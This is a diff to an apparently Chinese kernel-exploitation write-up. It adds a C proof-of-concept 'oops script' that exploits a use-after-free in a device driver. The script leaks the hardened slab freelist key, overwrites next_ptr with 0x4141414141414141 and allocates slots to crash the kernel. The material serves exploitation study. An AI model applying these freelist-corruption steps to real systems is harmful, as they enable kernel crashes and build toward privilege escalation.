@@ -94,7 +94,35 @@ oops脚本:<br>
 2、uaf修改next_ptr为非法地址
 3、申请到该非法地址，触发oops
 ```
+oops脚本:<br>
+```c
+    // step 0 : construct `next_ptr = null situation`
+    int fd[8]; // 4096/0x200=8
+    for(int i=0;i<8;i++){
+        fd[i] = open_device();
+    }
+    char buf[1048];
+    // step 1: free the chunk -> freelist
+    printf("step1\n");
+    free_slot(fd[0],buf,0);
+    // step 2: leak the swab(&ptr) ^ random
+    printf("step2\n");
+    memset(buf,0,1048);
+    read_slot(fd[0],buf,0x1d0);
+    printf("key: %llx\n",*(unsigned long long *)(buf+0xe8));
 
+    // step 3: change next_ptr -> 0x4141414141414141
+    printf("step3\n");
+    unsigned long long key = *(unsigned long long *)(buf+0xe8);
+    key = key ^ 0x4141414141414141;
+    *(unsigned long long *)(buf+0xe8) = key;
+    write_slot(fd[0],buf,0x1d0);
+
+    // step 4: alloc slot
+    printf("step4\n");
+    int fd2 = open_device();
+    int fd3 = open_device();
+```
 
 
 ## 5.5<br>
